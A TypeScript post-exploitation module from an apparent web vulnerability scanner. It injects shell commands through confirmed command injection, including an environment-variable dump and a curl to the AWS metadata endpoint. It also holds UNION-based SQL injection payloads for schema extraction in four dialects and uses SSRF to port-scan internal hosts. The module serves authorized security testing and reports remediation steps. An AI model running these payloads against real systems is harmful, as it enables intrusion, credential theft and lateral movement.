// InjectProof — Automated Post-Exploitation & Lateral Movement
// Safe evidence gathering for confirmed RCE, SQLi, SSRF
// ADDITIVE module — does not modify existing scanners

import type { CrawledEndpoint, DetectorResult } from '@/types';
import { buildRequestString, buildResponseString } from '@/lib/utils';

interface PostExploitConfig {
    baseUrl: string;
    requestTimeout: number;
    userAgent: string;
    authHeaders?: Record<string, string>;
}

async function probe(
    url: string, method: string, config: PostExploitConfig,
    body?: string, contentType?: string, headers?: Record<string, string>,
): Promise<{ status: number; body: string; time: number; reqStr: string; resStr: string } | null> {
    try {
        const h: Record<string, string> = { 'User-Agent': config.userAgent, ...config.authHeaders, ...headers };
        if (contentType) h['Content-Type'] = contentType;
        const start = Date.now();
        const r = await fetch(url, { method, headers: h, body, signal: AbortSignal.timeout(config.requestTimeout), redirect: 'manual' });
        const respBody = await r.text();
        const respHeaders: Record<string, string> = {};
        r.headers.forEach((v, k) => { respHeaders[k] = v; });
        return { status: r.status, body: respBody, time: Date.now() - start, reqStr: buildRequestString(method, url, h, body), resStr: buildResponseString(r.status, respHeaders, respBody) };
    } catch { return null; }
}

// ============================================================
// 1) RCE EVIDENCE GATHERING (Benign Commands Only)
// ============================================================

/** When RCE is confirmed (cmd_injection or ssti), gather safe evidence */
export async function gatherRceEvidence(
    endpoint: CrawledEndpoint,
    param: string,
    confirmedPayloadPrefix: string,
    config: PostExploitConfig,
): Promise<DetectorResult[]> {
    const results: DetectorResult[] = [];

    // Only benign, read-only commands for proof of impact
    const evidenceCommands = [
        { cmd: 'id', name: 'User Identity', indicator: /uid=\d+/, os: 'unix' },
        { cmd: 'whoami', name: 'Current User', indicator: /\w+/, os: 'both' },
        { cmd: 'uname -a', name: 'System Info', indicator: /Linux|Darwin|BSD/, os: 'unix' },
        { cmd: 'hostname', name: 'Hostname', indicator: /\w+/, os: 'both' },
        { cmd: 'pwd', name: 'Working Directory', indicator: /\//, os: 'unix' },
        { cmd: 'cat /etc/os-release', name: 'OS Release', indicator: /NAME=|VERSION=/, os: 'unix' },
        { cmd: 'env | head -20', name: 'Environment Variables (first 20)', indicator: /\w+=/, os: 'unix' },
        { cmd: 'cat /proc/self/cgroup', name: 'Container Detection', indicator: /docker|kubepods|containerd/, os: 'unix' },
        { cmd: 'curl -s http://169.254.169.254/latest/meta-data/', name: 'Cloud Metadata Check', indicator: /ami-id|instance-id/, os: 'unix' },
    ];

    const collectedEvidence: Record<string, string> = {};

    for (const evidence of evidenceCommands) {
        const payload = `${confirmedPayloadPrefix}${evidence.cmd}`;

        let testUrl = endpoint.url;
        let body: string | undefined;
        const configuredParam = endpoint.params.find(p => p.name === param);

        if (configuredParam?.type === 'query') {
            const u = new URL(endpoint.url);
            u.searchParams.set(param, payload);
            testUrl = u.toString();
        } else {
            body = `${encodeURIComponent(param)}=${encodeURIComponent(payload)}`;
        }

        const result = await probe(
            testUrl,
            configuredParam?.type === 'query' ? 'GET' : 'POST',
            config, body,
            body ? 'application/x-www-form-urlencoded' : undefined,
        );
        if (!result) continue;

        if (evidence.indicator.test(result.body)) {
            // Extract the relevant output
            const output = result.body.substring(0, 1000);
            collectedEvidence[evidence.name] = output;

            // Check for cloud metadata (extra critical finding)
            if (evidence.cmd.includes('169.254') && evidence.indicator.test(result.body)) {
                results.push({
                    found: true,
                    title: `RCE → Cloud Metadata Access via "${param}"`,
                    description: `Starting from command injection in "${param}", successfully accessed AWS instance metadata. This confirms cloud infrastructure compromise.`,
                    category: 'post_exploitation',
                    severity: 'critical',
                    confidence: 'high',
                    cweId: 'CWE-78',
                    affectedUrl: endpoint.url,
                    httpMethod: configuredParam?.type === 'query' ? 'GET' : 'POST',
                    parameter: param,
                    payload,
                    request: result.reqStr,
                    response: result.resStr,
                    responseCode: result.status,
                    cloudMetadataExtracted: true,
                    internalNetworkExposure: true,
                    attackChainGraph: JSON.stringify({
                        nodes: [
                            { id: 'rce', type: 'vulnerability', label: `Command Injection in ${param}` },
                            { id: 'exec', type: 'pivot', label: 'Arbitrary Command Execution' },
                            { id: 'cloud', type: 'impact', label: 'AWS Metadata Access' },
                        ],
                        edges: [{ from: 'rce', to: 'exec' }, { from: 'exec', to: 'cloud' }],
                    }),
                    impact: 'Command injection led to cloud metadata access, enabling IAM credential theft and full AWS account compromise.',
                    remediation: 'Fix the command injection vulnerability immediately. Implement IMDSv2. Apply network-level SSRF protections.',
                    mappedOwasp: ['A03:2021'],
                    mappedNist: ['SI-10', 'SC-7'],
                });
            }

            // Check for container detection
            if (evidence.cmd.includes('cgroup') && /docker|kubepods|containerd/.test(result.body)) {
                collectedEvidence['Container'] = 'Application runs inside a container (Docker/Kubernetes)';
            }
        }
    }

    // Summary post-exploitation finding
    if (Object.keys(collectedEvidence).length > 0) {
        results.push({
            found: true,
            title: `Post-Exploitation Evidence Collected via "${param}"`,
            description: `Automated post-exploitation gathered ${Object.keys(collectedEvidence).length} pieces of evidence confirming system access through command injection in "${param}".`,
            category: 'post_exploitation',
            severity: 'critical',
            confidence: 'high',
            cweId: 'CWE-78',
            affectedUrl: endpoint.url,
            httpMethod: 'POST',
            parameter: param,
            postExploitationEvidence: JSON.stringify(collectedEvidence, null, 2),
            impact: `Full system access confirmed. Collected: ${Object.keys(collectedEvidence).join(', ')}.`,
            remediation: 'This vulnerability provides complete server compromise. Immediate remediation required: fix the injection vector, rotate all credentials on the affected host, and audit for persistence.',
            reproductionSteps: [
                `Exploit command injection in "${param}" using prefix: ${confirmedPayloadPrefix}`,
                `Execute: id, whoami, uname -a, hostname`,
                `All commands return valid output confirming RCE`,
            ],
            mappedOwasp: ['A03:2021'],
            mappedNist: ['SI-10', 'IR-6'],
        });
    }

    return results;
}

// ============================================================
// 2) SQLi SAFE DATABASE SCHEMA EXTRACTION
// ============================================================

/** Extract database schema (table/column names only) via confirmed SQLi */
export async function extractDatabaseSchema(
    endpoint: CrawledEndpoint,
    param: string,
    sqlDialect: 'mysql' | 'postgres' | 'sqlite' | 'mssql',
    config: PostExploitConfig,
): Promise<DetectorResult[]> {
    const results: DetectorResult[] = [];

    // Schema extraction queries (safe — no data exfiltration)
    const schemaQueries: Record<string, Array<{ query: string; name: string }>> = {
        mysql: [
            { query: "' UNION SELECT group_concat(table_name), NULL FROM information_schema.tables WHERE table_schema=database()-- -", name: 'Table Names' },
            { query: "' UNION SELECT group_concat(column_name), NULL FROM information_schema.columns WHERE table_schema=database()-- -", name: 'Column Names' },
            { query: "' UNION SELECT version(), database()-- -", name: 'Version & Database' },
            { query: "' UNION SELECT user(), @@hostname-- -", name: 'Current User & Host' },
        ],
        postgres: [
            { query: "' UNION SELECT string_agg(tablename,','), NULL FROM pg_tables WHERE schemaname='public'-- -", name: 'Table Names' },
            { query: "' UNION SELECT version(), current_database()-- -", name: 'Version & Database' },
            { query: "' UNION SELECT current_user, inet_server_addr()::text-- -", name: 'Current User & Server' },
        ],
        sqlite: [
            { query: "' UNION SELECT group_concat(name), NULL FROM sqlite_master WHERE type='table'-- -", name: 'Table Names' },
            { query: "' UNION SELECT sqlite_version(), NULL-- -", name: 'SQLite Version' },
        ],
        mssql: [
            { query: "' UNION SELECT name, NULL FROM sys.tables-- -", name: 'Table Names' },
            { query: "' UNION SELECT @@version, db_name()-- -", name: 'Version & Database' },
            { query: "' UNION SELECT system_user, host_name()-- -", name: 'System User & Host' },
        ],
    };

    const queries = schemaQueries[sqlDialect] || schemaQueries.mysql;
    const extractedSchema: Record<string, string> = {};

    for (const q of queries) {
        let testUrl = endpoint.url;
        let body: string | undefined;
        const configuredParam = endpoint.params.find(p => p.name === param);

        if (configuredParam?.type === 'query') {
            const u = new URL(endpoint.url);
            u.searchParams.set(param, q.query);
            testUrl = u.toString();
        } else {
            body = `${encodeURIComponent(param)}=${encodeURIComponent(q.query)}`;
        }

        const result = await probe(
            testUrl,
            configuredParam?.type === 'query' ? 'GET' : 'POST',
            config, body,
            body ? 'application/x-www-form-urlencoded' : undefined,
        );
        if (!result) continue;

        // Check if schema data was returned
        if (result.status >= 200 && result.status < 400 && result.body.length > 50) {
            extractedSchema[q.name] = result.body.substring(0, 2000);
        }
    }

    if (Object.keys(extractedSchema).length > 0) {
        results.push({
            found: true,
            title: `Database Schema Extracted via SQLi in "${param}" (${sqlDialect})`,
            description: `Automated safe schema extraction collected ${Object.keys(extractedSchema).length} data points: ${Object.keys(extractedSchema).join(', ')}. No full data dumps were performed.`,
            category: 'post_exploitation',
            severity: 'critical',
            confidence: 'high',
            cweId: 'CWE-89',
            cweTitle: 'SQL Injection',
            affectedUrl: endpoint.url,
            httpMethod: 'GET',
            parameter: param,
            postExploitationEvidence: JSON.stringify(extractedSchema, null, 2),
            impact: `Full database schema extracted. An attacker can enumerate all tables and columns, then extract sensitive data including user credentials, PII, and financial records.`,
            remediation: 'Fix the SQL injection vulnerability by using parameterized queries. Rotate all database credentials. Audit access logs for unauthorized queries.',
            reproductionSteps: [
                `Use confirmed SQLi in "${param}"`,
                `Execute UNION-based queries to extract schema from information_schema`,
                `Extracted: ${Object.keys(extractedSchema).join(', ')}`,
            ],
            mappedOwasp: ['A03:2021'],
            mappedNist: ['SI-10'],
        });
    }

    return results;
}

// ============================================================
// 3) INTERNAL PORT SCANNING VIA SSRF/SQLi PROXY
// ============================================================

/** Use confirmed SSRF as proxy to scan internal network ports */
export async function scanInternalPorts(
    endpoint: CrawledEndpoint,
    ssrfParam: string,
    config: PostExploitConfig,
): Promise<DetectorResult[]> {
    const results: DetectorResult[] = [];

    const internalHosts = ['127.0.0.1', '10.0.0.1', '172.17.0.1', '192.168.1.1'];
    const criticalPorts = [
        { port: 22, service: 'SSH' },
        { port: 80, service: 'HTTP' },
        { port: 443, service: 'HTTPS' },
        { port: 3306, service: 'MySQL' },
        { port: 5432, service: 'PostgreSQL' },
        { port: 6379, service: 'Redis' },
        { port: 27017, service: 'MongoDB' },
        { port: 9200, service: 'Elasticsearch' },
        { port: 11211, service: 'Memcached' },
        { port: 8080, service: 'HTTP Alt/Jenkins' },
        { port: 8443, service: 'HTTPS Alt' },
        { port: 2375, service: 'Docker API' },
        { port: 10250, service: 'Kubelet' },
        { port: 6443, service: 'K8s API' },
        { port: 2379, service: 'etcd' },
        { port: 5672, service: 'RabbitMQ' },
        { port: 9092, service: 'Kafka' },
    ];

    const openPorts: Array<{ host: string; port: number; service: string }> = [];

    for (const host of internalHosts) {
        for (const portInfo of criticalPorts) {
            const targetUrl = `http://${host}:${portInfo.port}/`;
            const u = new URL(endpoint.url);
            u.searchParams.set(ssrfParam, targetUrl);

            const result = await probe(u.toString(), 'GET', config);
            if (!result) continue;

            // If response differs from default error (port is open)
            if (result.status !== 504 && result.status !== 502 && result.body.length > 20) {
                openPorts.push({ host, port: portInfo.port, service: portInfo.service });
            }
        }
    }

    if (openPorts.length > 0) {
        const portMap = openPorts.map(p => `${p.host}:${p.port} (${p.service})`).join('\n');

        results.push({
            found: true,
            title: `Internal Network Scan: ${openPorts.length} Open Ports via SSRF`,
            description: `Using SSRF in "${ssrfParam}", performed an internal port scan and discovered ${openPorts.length} accessible services on the internal network.`,
            category: 'post_exploitation',
            severity: 'high',
            confidence: 'medium',
            cweId: 'CWE-918',
            affectedUrl: endpoint.url,
            httpMethod: 'GET',
            parameter: ssrfParam,
            internalNetworkExposure: true,
            postExploitationEvidence: JSON.stringify({ openPorts, scanSummary: portMap }, null, 2),
            attackChainGraph: JSON.stringify({
                nodes: [
                    { id: 'ssrf', type: 'vulnerability', label: `SSRF in ${ssrfParam}` },
                    { id: 'scan', type: 'pivot', label: 'Internal Port Scan' },
                    ...openPorts.slice(0, 5).map((p, i) => ({
                        id: `port${i}`, type: 'discovery', label: `${p.host}:${p.port} (${p.service})`,
                    })),
                ],
                edges: [
                    { from: 'ssrf', to: 'scan' },
                    ...openPorts.slice(0, 5).map((_, i) => ({ from: 'scan', to: `port${i}` })),
                ],
            }),
            impact: `Internal network services discovered:\n${portMap}\n\nThese services are not exposed to the internet but are reachable via SSRF, enabling further lateral movement.`,
            remediation: 'Fix the SSRF vulnerability. Implement network segmentation. Apply principle of least privilege for service-to-service communication.',
            reproductionSteps: [
                `Use confirmed SSRF in "${ssrfParam}"`,
                `Sweep internal IP ranges on common ports`,
                `Identified ${openPorts.length} open services`,
            ],
            mappedOwasp: ['A10:2021'],
            mappedNist: ['SC-7', 'AC-4'],
        });
    }

    return results;
}
